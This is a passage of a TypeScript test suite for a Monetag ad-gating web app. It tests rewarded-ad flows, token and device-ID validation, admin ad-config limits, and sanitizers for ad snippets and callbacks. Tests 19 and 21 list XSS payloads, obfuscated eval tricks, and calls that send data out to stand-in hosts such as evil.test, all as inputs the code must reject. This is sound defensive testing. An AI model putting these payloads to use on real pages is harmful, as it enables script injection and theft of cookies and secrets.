      setAttribute: () => {},
      onclick: null,
    };
    Object.defineProperty(el, 'innerHTML', {
      get: () => el._innerHTML,
      set: (val: string) => {
        el._innerHTML = val;
        if (val.includes('mrs-sim-cancel')) {
          createdEls['mrs-sim-cancel'] = { onclick: null };
        }
        if (val.includes('mrs-sim-timer')) {
          createdEls['mrs-sim-timer'] = { textContent: '' };
        }
      },
    });
    if (id) createdEls[id] = el;
    return el;
  };

  // Verify default disabled state (Rule 6: hidden when Monetag rewarded is disabled)
  const disabledSandbox: any = {
    console, Date, Math, JSON, Promise, Error, parseInt,
    setTimeout: () => 1, clearTimeout: () => {}, setInterval: () => 2, clearInterval: () => {},
    CustomEvent: class CustomEvent { type: string; detail: any; constructor(t: string, o?: any) { this.type = t; this.detail = o?.detail; } },
    addEventListener: () => {}, dispatchEvent: () => true,
    MRS_AD_STATE: 'free',
    MRS_ADS_CONFIG: { apiBaseUrl: '', testMode: true, monetag: { rewarded: { enabled: false, snippet: null, showFn: null } } },
    __MRS_ADS_SERVER_CONFIG: { testMode: true, monetag: { rewardedEnabled: false }, rewards: { cooldownMinutes: 180, anyRewardedAvailable: false } },
    MRS_ADS: { state: () => 'free', enterVipMode: () => {}, refresh: async () => 'free' },
    localStorage: { getItem: () => null, setItem: () => {}, removeItem: () => {} },
    document: { readyState: 'complete', body: { appendChild: () => {} }, createElement: () => makeEl('div'), getElementById: () => null, addEventListener: () => {} },
    fetch: async () => ({ ok: false, status: 404, json: async () => ({}) }),
  };
  disabledSandbox.window = disabledSandbox;
  vm.runInNewContext(rewardAdsSource, disabledSandbox, { filename: 'rewardAds.js' });
  assert.equal(disabledSandbox.MRS_REWARD_ADS.isAvailable().available, false);

  const sandbox: any = {
    console,
    Date,
    Math,
    JSON,
    Promise,
    Error,
    parseInt,
    setTimeout: () => 1,
    clearTimeout: () => {},
    setInterval: (fn: any) => {
      intervalCb = fn;
      return 2;
    },
    clearInterval: () => {},
    CustomEvent: class CustomEvent { type: string; detail: any; constructor(t: string, o?: any) { this.type = t; this.detail = o?.detail; } },
    addEventListener: () => {},
    dispatchEvent: () => true,
    MRS_AD_STATE: 'free',
    MRS_ADS_CONFIG: { apiBaseUrl: '', testMode: true, monetag: { rewarded: { enabled: true } } },
    __MRS_ADS_SERVER_CONFIG: { testMode: true, monetag: { rewardedEnabled: true }, rewards: { cooldownMinutes: 180, anyRewardedAvailable: true } },
    MRS_ADS: {
      state: () => sandbox.MRS_AD_STATE,
      enterVipMode: () => {
        enterVipCalls += 1;
        sandbox.MRS_AD_STATE = 'vip';
      },
      refresh: async () => sandbox.MRS_AD_STATE,
    },
    localStorage: {
      getItem: (k: string) => (storageMap.has(k) ? storageMap.get(k)! : null),
      setItem: (k: string, v: string) => { storageMap.set(k, String(v)); },
      removeItem: (k: string) => { storageMap.delete(k); },
    },
    document: {
      readyState: 'complete',
      body: { appendChild: (el: any) => { if (el.id) createdEls[el.id] = el; } },
      createElement: (tag: string) => makeEl(tag),
      getElementById: (id: string) => createdEls[id] || null,
      addEventListener: () => {},
    },
    fetch: async (url: string) => {
      if (url.includes('/api/rewards/start')) {
        return {
          ok: true,
          status: 200,
          json: async () => ({ ok: true, data: { nonce: 'a'.repeat(48), network: 'monetag', minWatchMs: 2000 } }),
        };
      }
      if (url.includes('/api/rewards/claim')) {
        claimCalls += 1;
        return {
          ok: true,
          status: 200,
          json: async () => ({
            ok: true,
            data: { token: 'signed-reward-token', plan: 'reward1h', expiresAt: new Date(Date.now() + 3600_000).toISOString() },
          }),
        };
      }
      return { ok: false, status: 404, json: async () => ({ ok: false }) };
    },
  };
  sandbox.window = sandbox;

  vm.runInNewContext(rewardAdsSource, sandbox, { filename: 'rewardAds.js' });

  // Case A: User cancels simulated ad before completion -> rejects & 0 claim calls
  const cancelPromise = sandbox.MRS_REWARD_ADS.startAndWatch('monetag');
  await new Promise((r) => setTimeout(r, 20));
  assert.ok(createdEls['mrs-sim-cancel']?.onclick);
  createdEls['mrs-sim-cancel'].onclick();
  await assert.rejects(cancelPromise, /closed before completion/i);
  assert.equal(claimCalls, 0);
  assert.equal(enterVipCalls, 0);

  // Case B: User waits to completion -> claims token, sets mrs_reward_just_unlocked, calls enterVipMode()
  const okPromise = sandbox.MRS_REWARD_ADS.startAndWatch('monetag');
  await new Promise((r) => setTimeout(r, 20));
  assert.ok(typeof intervalCb === 'function');
  intervalCb();
  intervalCb();
  const ent = await okPromise;
  assert.equal(ent.plan, 'reward1h');
  assert.equal(claimCalls, 1);
  assert.equal(enterVipCalls, 1);
  assert.equal(storageMap.get('mrs_reward_just_unlocked'), '1');
});

test('15. rewardAds.js crypto-random device ID & secure global callback resolution (no prototype chain access)', async () => {
  const storageMap = new Map<string, string>();
  let capturedDeviceId = '';
  let sdkThisBound = false;
  let sdkCallCount = 0;

  const makeLiveSandbox = (rewardedShowFn: string) => {
    const sb: any = {
      console, Date, Math, JSON, Promise, Error, parseInt, Uint8Array,
      crypto: webcrypto,
      setTimeout: () => 1, clearTimeout: () => {}, setInterval: () => 2, clearInterval: () => {},
      CustomEvent: class CustomEvent { type: string; detail: any; constructor(t: string, o?: any) { this.type = t; this.detail = o?.detail; } },
      addEventListener: () => {}, dispatchEvent: () => true,
      MRS_AD_STATE: 'free',
      MRS_ADS_CONFIG: { apiBaseUrl: '', testMode: false, monetag: { rewarded: { enabled: true } } },
      __MRS_ADS_SERVER_CONFIG: {
        testMode: false,
        monetag: { rewardedEnabled: true, rewardedShowFn },
        rewards: { cooldownMinutes: 180, anyRewardedAvailable: true },
      },
      MRS_ADS: {
        state: () => sb.MRS_AD_STATE,
        enterVipMode: () => { sb.MRS_AD_STATE = 'vip'; },
        refresh: async () => sb.MRS_AD_STATE,
      },
      MonetagSDK: {
        tag: 'ok',
        show(this: any, onComplete: () => void) {
          sdkThisBound = this === sb.MonetagSDK && this.tag === 'ok';
          sdkCallCount += 1;
          onComplete();
        },
      },
      localStorage: {
        getItem: (k: string) => (storageMap.has(k) ? storageMap.get(k)! : null),
        setItem: (k: string, v: string) => { storageMap.set(k, String(v)); },
        removeItem: (k: string) => { storageMap.delete(k); },
      },
      document: {
        readyState: 'complete',
        body: { appendChild: () => {} },
        createElement: () => ({ style: {}, setAttribute: () => {}, innerHTML: '' }),
        getElementById: () => null,
        addEventListener: () => {},
      },
      fetch: async (url: string, init?: any) => {
        if (url.includes('/api/rewards/start')) {
          const body = JSON.parse(init?.body || '{}');
          capturedDeviceId = body.deviceId;
          return {
            ok: true,
            status: 200,
            json: async () => ({ ok: true, data: { nonce: 'b'.repeat(48), network: 'monetag', minWatchMs: 100 } }),
          };
        }
        if (url.includes('/api/rewards/claim')) {
          return {
            ok: true,
            status: 200,
            json: async () => ({
              ok: true,
              data: { token: 'signed-live-reward-tok', plan: 'reward1h', expiresAt: new Date(Date.now() + 3600_000).toISOString() },
            }),
          };
        }
        return { ok: false, status: 404, json: async () => ({ ok: false }) };
      },
    };
    sb.window = sb;
    return sb;
  };

  // Blocked prototype/built-in/case-spoofed paths must never resolve
  for (const blockedPath of ['__proto__.constructor', 'Eval', 'Object', 'DOMTarget.show']) {
    storageMap.clear();
    capturedDeviceId = '';
    const blockedSb = makeLiveSandbox(blockedPath);
    blockedSb.Node = class MockNode {};
    blockedSb.DOMTarget = new blockedSb.Node();
    blockedSb.DOMTarget.show = () => {};
    vm.runInNewContext(rewardAdsSource, blockedSb, { filename: 'rewardAds.js' });
    await assert.rejects(blockedSb.MRS_REWARD_ADS.startAndWatch('monetag'), /not configured/i);
    assert.match(capturedDeviceId, /^[0-9a-f]{48}$/);
  }

  // Valid namespaced MonetagSDK.show resolves own-property with receiver intact
  storageMap.clear();
  capturedDeviceId = '';
  const validSb = makeLiveSandbox('MonetagSDK.show');
  vm.runInNewContext(rewardAdsSource, validSb, { filename: 'rewardAds.js' });
  const ent = await validSb.MRS_REWARD_ADS.startAndWatch('monetag');
  assert.equal(ent.plan, 'reward1h');
  assert.equal(sdkThisBound, true);
  assert.equal(sdkCallCount, 1);
  assert.match(capturedDeviceId, /^[0-9a-f]{48}$/);
});

test('16. Device ID sanitization and CSPRNG token generation/verification enforce strict formats', async () => {
  assert.equal(sanitizeDeviceId('short-id'), null);
  assert.equal(sanitizeDeviceId('bad\nid\rwith-crlf-12345'), null);
  assert.equal(sanitizeDeviceId({ toString: () => 'valid-object-device-123' }), null);
  assert.equal(sanitizeDeviceId('  valid_device-id_12345  '), 'valid_device-id_12345');

  const badStartRes = await fetch(`${baseUrl}/api/rewards/start`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ deviceId: 'short', network: 'monetag' }),
  });
  assert.equal(badStartRes.status, 400);
  const badStartJson = await badStartRes.json() as any;
  assert.equal(badStartJson.error.code, 'invalid_device');

  // CSPRNG jti + iat ensure consecutive tokens with identical logical claims differ
  const futureExp = Math.floor(Date.now() / 1000) + 3600;
  const tokA = signToken({ v: 1, cid: 1, dev: 'abc123def456', plan: '1m', exp: futureExp });
  const tokB = signToken({ v: 1, cid: 1, dev: 'abc123def456', plan: '1m', exp: futureExp });
  assert.notEqual(tokA, tokB);

  const verifiedA = verifyToken(tokA);
  assert.ok(verifiedA);
  assert.match(String(verifiedA.jti), /^[0-9a-f]{24}$/);
  assert.equal(typeof verifiedA.iat, 'number');

  // Malformed token formats rejected by verifyToken
  assert.equal(verifyToken(`${tokA}.extra`), null);
  assert.equal(verifyToken('not!valid.base64url!'), null);
  assert.equal(verifyToken(null as any), null);

  // checkEntitlement rejects invalid deviceId even with valid token
  const badEnt = checkEntitlement({ token: activeVipToken, deviceId: 'bad' });
  assert.equal(badEnt.ok, false);
  assert.equal(badEnt.code, 'invalid_token');
});

test('17. Centralized Monetag IDs/zones and granular ad caps persist via admin API with strict bounds validation', async () => {
  // Verify GET /api/ads/config exposes centralized zones & caps
  const initialRes = await fetch(`${baseUrl}/api/ads/config`);
  assert.equal(initialRes.status, 200);
  const initialJson = await initialRes.json() as any;
  assert.equal(initialJson.data.monetag.verificationId, MONETAG_DEFAULT_VERIFICATION_ID);
  assert.equal(initialJson.data.monetag.vignetteZoneId, '11242067');
  assert.equal(initialJson.data.monetag.interstitialZoneId, MONETAG_DEFAULT_INTERSTITIAL_ZONE_ID);
  assert.equal(initialJson.data.monetag.popunderZoneId, '11226634');
  assert.equal(initialJson.data.monetag.vignette.url, 'https://uplcm.com/4/11242067');
  assert.equal(initialJson.data.monetag.interstitial.url, 'https://uplcm.com/4/11242067');
  assert.equal(initialJson.data.monetag.popunder.url, 'https://uplcm.com/4/11226634');
  assert.equal(initialJson.data.monetag.zones.length, MONETAG_CANONICAL_ZONES.length);
  assert.equal(initialJson.data.monetag.caps.interstitialCooldownMs, 180_000);
  assert.equal(initialJson.data.monetag.caps.interstitialMaxPerDay, 12);

  // Reject out-of-range caps & invalid verification/zone IDs
  const badCapRes = await fetch(`${baseUrl}/api/admin/ads/config`, {
    method: 'PUT',
    headers: { 'Content-Type': 'application/json', 'x-admin-token': 'test-admin-secret-123' },
    body: JSON.stringify({ monetag: { caps: { popunderMaxPerDay: 999 } } }),
  });
  assert.equal(badCapRes.status, 400);
  assert.equal(((await badCapRes.json()) as any).error.code, 'invalid_ad_cap');

  const badVerRes = await fetch(`${baseUrl}/api/admin/ads/config`, {
    method: 'PUT',
    headers: { 'Content-Type': 'application/json', 'x-admin-token': 'test-admin-secret-123' },
    body: JSON.stringify({ monetag: { verificationId: 'bad!' } }),
  });
  assert.equal(badVerRes.status, 400);
  assert.equal(((await badVerRes.json()) as any).error.code, 'invalid_verification_id');

  const badZoneRes = await fetch(`${baseUrl}/api/admin/ads/config`, {
    method: 'PUT',
    headers: { 'Content-Type': 'application/json', 'x-admin-token': 'test-admin-secret-123' },
    body: JSON.stringify({ monetag: { interstitialZoneId: 'bad zone!' } }),
  });
  assert.equal(badZoneRes.status, 400);
  assert.equal(((await badZoneRes.json()) as any).error.code, 'invalid_zone_id');

  // Update granular caps and centralized zone IDs cleanly
  const updateRes = await fetch(`${baseUrl}/api/admin/ads/config`, {
    method: 'PUT',
    headers: { 'Content-Type': 'application/json', 'x-admin-token': 'test-admin-secret-123' },
    body: JSON.stringify({
      monetag: {
        vignetteZoneId: '9912130',
        interstitialZoneId: '11242744',
        popunderZoneId: '11683565',
        caps: {
          popunderCooldownMinutes: 45,
          popunderMaxPerDay: 2,
          interstitialCooldownSeconds: 240,
          interstitialMaxPerDay: 5,
          pushDelaySeconds: 90,
          pushMinVisits: 3,
          pushDeclineDays: 14,
          emptySlotCollapseMs: 2500,
        },
        rewarded: { zoneId: '11242067' },
      },
    }),
  });
  assert.equal(updateRes.status, 200);
  const updatedRes = await fetch(`${baseUrl}/api/ads/config`);
  const updatedJson = await updatedRes.json() as any;
  assert.equal(updatedJson.data.monetag.vignetteZoneId, '9912130');
  assert.equal(updatedJson.data.monetag.vignette.url, 'https://uplcm.com/4/9912130');
  assert.equal(updatedJson.data.monetag.interstitialZoneId, '11242744');
  assert.equal(updatedJson.data.monetag.interstitial.url, 'https://uplcm.com/4/11242744');
  assert.equal(updatedJson.data.monetag.popunderZoneId, '11683565');
  assert.equal(updatedJson.data.monetag.caps.popunderCooldownMs, 45 * 60_000);
  assert.equal(updatedJson.data.monetag.caps.popunderMaxPerDay, 2);
  assert.equal(updatedJson.data.monetag.caps.interstitialCooldownMs, 240_000);
  assert.equal(updatedJson.data.monetag.caps.interstitialMaxPerDay, 5);
  assert.equal(updatedJson.data.monetag.caps.pushDelayMs, 90_000);
  assert.equal(updatedJson.data.monetag.caps.pushMinVisits, 3);
  assert.equal(updatedJson.data.monetag.caps.pushDeclineDays, 14);
  assert.equal(updatedJson.data.monetag.caps.emptySlotCollapseMs, 2500);

  // Restore defaults cleanly
  await fetch(`${baseUrl}/api/admin/ads/config`, {
    method: 'PUT',
    headers: { 'Content-Type': 'application/json', 'x-admin-token': 'test-admin-secret-123' },
    body: JSON.stringify({
      monetag: {
        vignetteZoneId: '11242067',
        interstitialZoneId: '11242067',
        popunderZoneId: '11226634',
        caps: {
          popunderCooldownMinutes: 30,
          popunderMaxPerDay: 3,
          interstitialCooldownSeconds: 180,
          interstitialMaxPerDay: 12,
          pushDelaySeconds: 60,
          pushMinVisits: 2,
          pushDeclineDays: 30,
          emptySlotCollapseMs: 4000,
        },
        rewarded: { zoneId: null },
      },
    }),
  });
});

test('18. Expanded forbidden rewarded callback blocklist blocks DOM/network/timer/dunder sinks & native built-ins', async () => {
  const expandedBlocked = [
    'queueMicrotask',
    'requestAnimationFrame',
    'BroadcastChannel',
    'cookieStore',
    'sendBeacon',
    '__defineGetter__',
    '__lookupSetter__',
    '__custom_dunder__',
    'document.body',
    'document.createElement',
    'innerHTML',
    'history.pushState',
    'navigator.clipboard',
    'Object.getOwnPropertyDescriptor',
    'AsyncFunction',
    '_',
    '$$',
    'serviceWorker.register',
  ];

  for (const candidate of expandedBlocked) {
    assert.equal(isValidShowFnIdentifier(candidate), false, `Expected ${candidate} to be blocked`);
    assert.throws(() => sanitizeShowFn(candidate), /Rewarded callback name/i);
  }
  assert.equal(isValidShowFnIdentifier('show_11226634'), true);
  assert.equal(isValidShowFnIdentifier('MonetagSDK.rewarded.show'), true);

  // rewardAds.js must also refuse any function whose toString contains [native code]
  const storageMap = new Map<string, string>();
  const nativeFnSandbox: any = {
    console, Date, Math, JSON, Promise, Error, parseInt, Uint8Array,
    crypto: webcrypto,
    setTimeout: () => 1, clearTimeout: () => {}, setInterval: () => 2, clearInterval: () => {},
    CustomEvent: class CustomEvent { type: string; detail: any; constructor(t: string, o?: any) { this.type = t; this.detail = o?.detail; } },
    addEventListener: () => {}, dispatchEvent: () => true,
    MRS_AD_STATE: 'free',
    MRS_ADS_CONFIG: { apiBaseUrl: '', testMode: false, monetag: { rewarded: { enabled: true } } },
    __MRS_ADS_SERVER_CONFIG: {
      testMode: false,
      monetag: { rewardedEnabled: true, rewardedShowFn: 'customNativeAlias' },
      rewards: { cooldownMinutes: 180, anyRewardedAvailable: true },
    },
    customNativeAlias: Math.max,
    MRS_ADS: { state: () => 'free', enterVipMode: () => {}, refresh: async () => 'free' },
    localStorage: {
      getItem: (k: string) => (storageMap.has(k) ? storageMap.get(k)! : null),
      setItem: (k: string, v: string) => { storageMap.set(k, String(v)); },
      removeItem: (k: string) => { storageMap.delete(k); },
    },
    document: { readyState: 'complete', body: { appendChild: () => {} }, createElement: () => ({ style: {}, setAttribute: () => {}, innerHTML: '' }), getElementById: () => null, addEventListener: () => {} },
    fetch: async () => ({ ok: true, status: 200, json: async () => ({ ok: true, data: { nonce: 'c'.repeat(48), network: 'monetag', minWatchMs: 100 } }) }),
  };
  nativeFnSandbox.window = nativeFnSandbox;
  vm.runInNewContext(rewardAdsSource, nativeFnSandbox, { filename: 'rewardAds.js' });
  await assert.rejects(nativeFnSandbox.MRS_REWARD_ADS.startAndWatch('monetag'), /not configured/i);
});

test('19. Dynamic zone URL validation, getter descriptor blocking, and snippet security filters', async () => {
  // Zone URL allowlist checks
  assert.equal(isSafeMonetagZoneUrl('https://uplcm.com/4/11226634'), true);
  assert.equal(isSafeMonetagZoneUrl('https://sub.monetag.com/tag.min.js'), true);
  assert.equal(isSafeMonetagZoneUrl('http://uplcm.com/4/11226634'), false);
  assert.equal(isSafeMonetagZoneUrl('https://evil.example/4/11226634'), false);
  assert.equal(isSafeMonetagZoneUrl('https://user:pass@uplcm.com/4/11226634'), false);
  assert.equal(isSafeMonetagZoneUrl('javascript:alert(1)'), false);

  // Newly added forbidden built-in / DOM / observer identifiers
  for (const extraBlocked of ['structuredClone', 'escape', 'WebAssembly', 'getComputedStyle', 'MutationObserver']) {
    assert.equal(isValidShowFnIdentifier(extraBlocked), false);
    assert.throws(() => sanitizeShowFn(extraBlocked), /Rewarded callback name/i);
  }

  // Enhanced sanitizeRewardedSnippet filters
  for (const badSnippet of [
    '<svg onload=alert(1)>',
    'var x = document.cookie;',
    'fetch("https://exfil.test")',
    'el.innerHTML = "<img src=x>"',
    'localStorage.getItem("tok")',
    'import("https://evil.test/x.js")',
  ]) {
    assert.throws(() => sanitizeRewardedSnippet(badSnippet), /disallowed inline/i);
  }
  assert.equal(
    sanitizeRewardedSnippet('<script src="https://uplcm.com/4/11226634" data-zone="11226634"></script>'),
    '<script src="https://uplcm.com/4/11226634" data-zone="11226634"></script>'
  );

  // rewardAds.js must reject accessor (getter/setter) traps before reading property
  let getterTriggered = false;
  const getterStorage = new Map<string, string>();
  const getterSandbox: any = {
    console, Date, Math, JSON, Promise, Error, parseInt, Uint8Array,
    crypto: webcrypto,
    setTimeout: () => 1, clearTimeout: () => {}, setInterval: () => 2, clearInterval: () => {},
    CustomEvent: class CustomEvent { type: string; detail: any; constructor(t: string, o?: any) { this.type = t; this.detail = o?.detail; } },
    addEventListener: () => {}, dispatchEvent: () => true,
    MRS_AD_STATE: 'free',
    MRS_ADS_CONFIG: { apiBaseUrl: '', testMode: false, monetag: { rewarded: { enabled: true } } },
    __MRS_ADS_SERVER_CONFIG: {
      testMode: false,
      monetag: { rewardedEnabled: true, rewardedShowFn: 'MonetagSDK.trapped' },
      rewards: { cooldownMinutes: 180, anyRewardedAvailable: true },
    },
    MonetagSDK: {},
    MRS_ADS: { state: () => 'free', enterVipMode: () => {}, refresh: async () => 'free' },
    localStorage: {
      getItem: (k: string) => (getterStorage.has(k) ? getterStorage.get(k)! : null),
      setItem: (k: string, v: string) => { getterStorage.set(k, String(v)); },
      removeItem: (k: string) => { getterStorage.delete(k); },
    },
    document: { readyState: 'complete', body: { appendChild: () => {} }, createElement: () => ({ style: {}, setAttribute: () => {}, innerHTML: '' }), getElementById: () => null, addEventListener: () => {} },
    fetch: async () => ({ ok: true, status: 200, json: async () => ({ ok: true, data: { nonce: 'd'.repeat(48), network: 'monetag', minWatchMs: 100 } }) }),
  };
  Object.defineProperty(getterSandbox.MonetagSDK, 'trapped', {
    configurable: true,
    enumerable: true,
    get() {
      getterTriggered = true;
      return () => {};
    },
  });
  getterSandbox.window = getterSandbox;
  vm.runInNewContext(rewardAdsSource, getterSandbox, { filename: 'rewardAds.js' });
  await assert.rejects(getterSandbox.MRS_REWARD_ADS.startAndWatch('monetag'), /not configured/i);
  assert.equal(getterTriggered, false);
});

test('20. ad-manager.js dynamically syncs interstitial zones & enforces interstitial cooldown/daily caps', async () => {
  const storageMap = new Map<string, string>();
  const injectedScripts: Array<{ src: string; attrs: Record<string, string> }> = [];
  const dispatchedEvents: string[] = [];

  const createManagerSandbox = (interstitialMaxPerDay: number) => {
    injectedScripts.length = 0;
    const sb: any = {
      console, Date, Math, JSON, Promise, Error, parseInt, URL, Blob,
      setTimeout: () => 1, clearTimeout: () => {}, setInterval: () => 2, clearInterval: () => {},
      CustomEvent: class CustomEvent { type: string; detail: any; constructor(t: string, o?: any) { this.type = t; this.detail = o?.detail; } },
      addEventListener: () => {},
      dispatchEvent: (ev: any) => {
        dispatchedEvents.push(ev?.type || '');
        return true;
      },
      MRS_AD_STATE: 'free',
      MRS_ADS: { state: () => 'free', _trackLoadedScript: () => {} },
      MRS_ADS_CONFIG: {
        apiBaseUrl: '',
        testMode: false,
        monetag: {
          verificationId: 'fa9656182dbc7301dcd9a2326441dcf3',
          showRegularAds: true,
          directZones: [{ id: 'uplcm-11226634', zoneId: '11226634', url: 'https://uplcm.com/4/11226634', label: 'Z1' }],
          interstitial: {
            zoneId: '11242067',
            url: 'https://uplcm.com/4/11242067',
            scriptSrc: 'https://uplcm.com/4/interstitial-tag.js',
            inlineSnippet: null,
          },
          vignette: {
            zoneId: '11242067',
            url: 'https://uplcm.com/4/11242067',
            scriptSrc: null,
            inlineSnippet: null,
          },
        },
        caps: { interstitialCooldownMs: 180000, interstitialMaxPerDay },
      },
      navigator: { language: 'en-US', userAgent: 'Mozilla/5.0' },
      location: { pathname: '/', hash: '' },
      innerWidth: 1280,
      localStorage: {
        getItem: (k: string) => (storageMap.has(k) ? storageMap.get(k)! : null),
        setItem: (k: string, v: string) => { storageMap.set(k, String(v)); },
        removeItem: (k: string) => { storageMap.delete(k); },
      },
      sessionStorage: {
        getItem: () => null,
        setItem: () => {},
      },
      document: {
        readyState: 'complete',
        documentElement: { getAttribute: () => null },
        body: {
          appendChild: (el: any) => {
            if (el.tagName === 'SCRIPT') injectedScripts.push({ src: el.src, attrs: el.attributes });
          },
        },
        querySelector: () => null,
        querySelectorAll: () => [],
        getElementById: () => null,
        createElement: (tag: string) => ({
          tagName: tag.toUpperCase(),
          attributes: {} as Record<string, string>,
          style: {},
          setAttribute(k: string, v: string) { this.attributes[k] = String(v); },
          getAttribute(k: string) { return this.attributes[k] || null; },
        }),
        addEventListener: () => {},
      },
      fetch: async (url: string) => {
        if (url.includes('/api/ads/config')) {
          return {
            ok: true,
            status: 200,
            json: async () => ({
              ok: true,
              data: {
                formats: { banner: true, sticky: false, popunder: false, interstitial: true, push: false },
                testMode: false,
                monetag: {
                  verificationId: 'fa9656182dbc7301dcd9a2326441dcf3',
                  interstitialZoneId: '11242744',
                  interstitial: { zoneId: '11242744', url: 'https://uplcm.com/4/11242744' },
                  zones: [
                    { id: 'uplcm-11242744', zoneId: '11242744', url: 'https://uplcm.com/4/11242744', label: 'Dynamic Safe' },
                    { id: 'bad-zone', zoneId: '99999999', url: 'https://malicious.invalid/bad', label: 'Unsafe' },
                  ],
                  showRegularAds: true,
                  caps: { interstitialCooldownMs: 180000, interstitialMaxPerDay },
                },
              },
            }),
          };
        }
        return { ok: true, status: 200, json: async () => ({ ok: true }) };
      },
    };
    sb.window = sb;
    vm.runInNewContext(adManagerSource, sb, { filename: 'ad-manager.js' });
    return sb;
  };

  // Case A: maxPerDay === 0 prevents interstitial script injection
  storageMap.clear();
  createManagerSandbox(0);
  await new Promise((r) => setTimeout(r, 25));
  assert.equal(injectedScripts.length, 0);

  // Case B: valid cap allows 1st interstitial injection with dynamic interstitialZoneId ('11242744'), filters out unsafe zone
  storageMap.clear();
  const sb = createManagerSandbox(2);
  await new Promise((r) => setTimeout(r, 25));
  assert.equal(injectedScripts.length, 1);
  assert.equal(injectedScripts[0].attrs['data-zone'], '11242744');
  assert.equal(sb.MRS_ADS_CONFIG.monetag.directZones.length, 1);
  assert.equal(sb.MRS_ADS_CONFIG.monetag.directZones[0].zoneId, '11242744');
  assert.ok(dispatchedEvents.includes('mrs_ads_config_loaded'));

  // Calling MRS_ADS_REFRESH_CONFIG immediately during active cooldown preserves cap enforcement
  await sb.MRS_ADS_REFRESH_CONFIG();
  const hist = JSON.parse(storageMap.get('mrs_ads_interstitial_hist') || '{}');
  assert.equal(hist.count, 1);
});

test('21. Enhanced reward snippet sanitization rejects obfuscated/DOM/external-host payloads and enforces CSP/interstitial sync', async () => {
  const maliciousSnippets = [
    '<script src="https://evil.test/payload.js"></script>',
    '<script src="http://uplcm.com/4/11226634"></script>',
    '<script src="https://uplcm.com/4/11226634">alert(1)</script>',
    '<script src="https://uplcm.com/4/11226634" onload="alert(1)"></script>',
    '<img src=x onerror=alert(1)>',
    '<math><mi><svg onload=alert(1)>',
    '<base href="https://evil.test/">',
    '&#x6a;avascript:alert(1)',
    '\\u0065val("alert(1)")',
    'window["loc"+"ation"] = "https://evil.test"',
    'setTimeout("alert(1)", 0)',
    'navigator.sendBeacon("https://evil.test", "secret")',
    'new WebSocket("wss://evil.test")',
    '(1).constructor.constructor("alert(1)")()',
    'String.fromCharCode(97,108,101,114,116)',
    'atob("YWxlcnQoMSk=")',
    '<!-- sneaky --><script>alert(1)</script>',
    '<script src="https://uplcm.com/4/11226634" data-zone="bad zone!"></script>',
  ];

  for (const payload of maliciousSnippets) {
    assert.throws(() => sanitizeRewardedSnippet(payload), /Rewarded snippet/i, `Should reject: ${payload}`);
    const apiRes = await fetch(`${baseUrl}/api/admin/ads/config`, {
      method: 'PUT',
      headers: { 'Content-Type': 'application/json', 'x-admin-token': 'test-admin-secret-123' },
      body: JSON.stringify({ monetag: { rewarded: { snippet: payload } } }),
    });
    assert.equal(apiRes.status, 400);
    const apiJson = await apiRes.json() as any;
    assert.equal(apiJson.error.code, 'invalid_snippet');
  }

  // Valid Monetag external script tag with allowlisted attributes passes cleanly
  const safeSnippet = '<script async src="https://sub.monetag.com/tag.min.js" data-zone="11242067" data-cfasync="false"></script>';
  assert.equal(sanitizeRewardedSnippet(safeSnippet), safeSnippet);

  // Admin API accepts nested monetag.interstitial.zoneId alias & returns synchronized interstitial config
  const aliasRes = await fetch(`${baseUrl}/api/admin/ads/config`, {
    method: 'PUT',
    headers: { 'Content-Type': 'application/json', 'x-admin-token': 'test-admin-secret-123' },
    body: JSON.stringify({
      monetag: { interstitial: { zoneId: '11242742' } },
    }),
  });
  assert.equal(aliasRes.status, 200);
  const cfgCheck = await fetch(`${baseUrl}/api/ads/config`);
  const cfgCheckJson = await cfgCheck.json() as any;
  assert.equal(cfgCheckJson.data.monetag.interstitialZoneId, '11242742');
  assert.equal(cfgCheckJson.data.monetag.interstitial.url, 'https://uplcm.com/4/11242742');

  // Restore default interstitial zone cleanly
  await fetch(`${baseUrl}/api/admin/ads/config`, {
    method: 'PUT',
    headers: { 'Content-Type': 'application/json', 'x-admin-token': 'test-admin-secret-123' },
    body: JSON.stringify({
      monetag: { interstitialZoneId: '11242067', rewarded: { snippet: null } },
    }),
  });

  // ad-manager.js must block unsafe inlineSnippet injection and remove injected interstitial nodes on VIP transition
  const injectedScripts: any[] = [];
  const removedIds: string[] = [];
  const fakeElements: Record<string, any> = {
    'mrs-monetag-interstitial': { id: 'mrs-monetag-interstitial', parentNode: { removeChild: () => removedIds.push('mrs-monetag-interstitial') } },
  };
  let listenerStateChange: ((e: any) => void) | null = null;
  let currentGateState = 'free';

  const mgrSb: any = {
    console, Date, Math, JSON, Promise, Error, parseInt, URL, Blob,
    setTimeout: () => 1, clearTimeout: () => {}, setInterval: () => 2, clearInterval: () => {},
    CustomEvent: class CustomEvent { type: string; detail: any; constructor(t: string, o?: any) { this.type = t; this.detail = o?.detail; } },
    addEventListener: (ev: string, fn: any) => { if (ev === 'mrs_ads_state_change') listenerStateChange = fn; },
    dispatchEvent: () => true,
    MRS_AD_STATE: 'free',
    MRS_ADS: { state: () => currentGateState, _trackLoadedScript: () => {} },
    MRS_ADS_CONFIG: {
      apiBaseUrl: '',
      testMode: false,
      monetag: {
        verificationId: 'fa9656182dbc7301dcd9a2326441dcf3',
        showRegularAds: true,
        directZones: [{ id: 'uplcm-11226634', zoneId: '11226634', url: 'https://uplcm.com/4/11226634', label: 'Z1' }],
        interstitial: {
          zoneId: '11242067',
          url: 'https://uplcm.com/4/11242067',
          scriptSrc: null,
          inlineSnippet: 'window["loc"+"ation"]="https://evil.test"',
        },
      },
      caps: { interstitialCooldownMs: 180000, interstitialMaxPerDay: 5 },
    },
    navigator: { language: 'en-US', userAgent: 'Mozilla/5.0' },
    location: { pathname: '/', hash: '' },
    innerWidth: 1280,
    localStorage: { getItem: () => null, setItem: () => {}, removeItem: () => {} },
    sessionStorage: { getItem: () => null, setItem: () => {} },
    document: {
      readyState: 'complete',
      documentElement: { getAttribute: () => null },
      body: { appendChild: (el: any) => injectedScripts.push(el) },
      querySelector: () => null,
      querySelectorAll: () => [],
      getElementById: (id: string) => fakeElements[id] || null,
      createElement: (tag: string) => ({
        tagName: tag.toUpperCase(),
        attributes: {} as Record<string, string>,
        style: {},
        setAttribute(k: string, v: string) { this.attributes[k] = String(v); },
      }),
      addEventListener: () => {},
    },
    fetch: async () => ({
      ok: true,
      status: 200,
      json: async () => ({
        ok: true,
        data: {
          formats: { banner: true, sticky: false, popunder: false, interstitial: true, push: false },
          testMode: false,
